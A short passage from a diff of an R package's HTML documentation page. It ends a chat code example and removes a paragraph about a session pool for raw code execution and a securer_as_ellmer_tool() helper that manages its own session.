 <span>  <span class="va">chat</span><span class="op">$</span><span class="fu">chat</span><span class="op">(</span><span class="va">user_message</span><span class="op">)</span></span>
 <span><span class="op">}</span></span></code></pre></div>
-<p>The pool pre-warms sessions for low-latency raw code execution via
-<code>pool$execute()</code>. For ellmer chat integration,
-<code><a href="../reference/securer_as_ellmer_tool.html">securer_as_ellmer_tool()</a></code> creates and manages its own
-session (cleaned up automatically when garbage collected).</p>
 </div>
   </main><aside class="col-md-3"><nav id="toc" aria-label="Table of contents"><h2>On this page</h2>
     </nav></aside>
